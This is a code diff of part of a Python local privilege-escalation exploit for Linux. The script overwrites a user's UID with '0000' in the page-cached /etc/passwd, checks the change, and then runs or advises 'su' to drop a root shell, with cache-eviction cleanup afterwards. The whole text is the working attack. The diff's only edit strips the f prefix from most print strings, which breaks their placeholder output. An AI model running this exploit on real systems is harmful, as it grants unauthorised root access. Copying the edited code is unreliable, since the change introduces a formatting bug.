@@ -145,14 +145,14 @@ def main(argv: list[str]) -> int:
         print("[!] Pick a different user or extend with multi-shot writes.")
         return 1
 
-    print(f"[*] Patching {uid_str!r} -> '0000' in page cache...")
+    print("[*] Patching {uid_str!r} -> '0000' in page cache...")
     write4(PASSWD, uid_off, b"0000")
 
     # Verify via fresh read (hits the page cache, not disk).
     with open(PASSWD, "rb") as f:
         f.seek(uid_off)
         landed = f.read(4)
-    print(f"[*] Page cache now reads {landed!r} at offset {uid_off}")
+    print("[*] Page cache now reads {landed!r} at offset {uid_off}")
     if landed != b"0000":
         print("[!] Patch did not land. Aborting.")
         return 1
@@ -160,7 +160,7 @@ def main(argv: list[str]) -> int:
     # Confirm libc agrees.
     try:
         pwent = pwd.getpwnam(user)
-        print(f"[*] getpwnam({user!r}).pw_uid = {pwent.pw_uid}")
+        print("[*] getpwnam({user!r}).pw_uid = {pwent.pw_uid}")
         if pwent.pw_uid != 0:
             print("[!] getpwnam still sees the real UID (NSS cache?). "
                   "Try clearing nscd/sssd cache, or run as a user that's "
@@ -169,15 +169,15 @@ def main(argv: list[str]) -> int:
         pass
 
     print()
-    print(f"[+] /etc/passwd page cache now lists {user} as UID 0.")
-    print(f"[+] Run:   su {user}")
-    print(f"[+] Enter your own password. su will setuid(0) and drop a root shell.")
+    print("[+] /etc/passwd page cache now lists {user} as UID 0.")
+    print("[+] Run:   su {user}")
+    print("[+] Enter your own password. su will setuid(0) and drop a root shell.")
     print()
-    print(f"[i] Cleanup after testing (from the root shell):")
-    print(f"[i]   echo 3 > /proc/sys/vm/drop_caches")
+    print("[i] Cleanup after testing (from the root shell):")
+    print("[i]   echo 3 > /proc/sys/vm/drop_caches")
 
     if do_exec:
-        print(f"[+] Executing `su {user}` now...")
+        print("[+] Executing `su {user}` now...")
         os.execvp("su", ["su", user])
 
     # If we are not exec'ing su (dry run), evict the corrupted page so the
@@ -189,8 +189,10 @@ def main(argv: list[str]) -> int:
             os.posix_fadvise(fd, 0, 0, os.POSIX_FADV_DONTNEED)
         finally:
             os.close(fd)
-        print(f"[i] /etc/passwd page cache evicted (POSIX_FADV_DONTNEED). "
-              f"UID->name lookups restored.")
+
+        print("[i] /etc/passwd page cache evicted (POSIX_FADV_DONTNEED). "
+            "UID->name lookups restored.")
+
     return 0
 
 
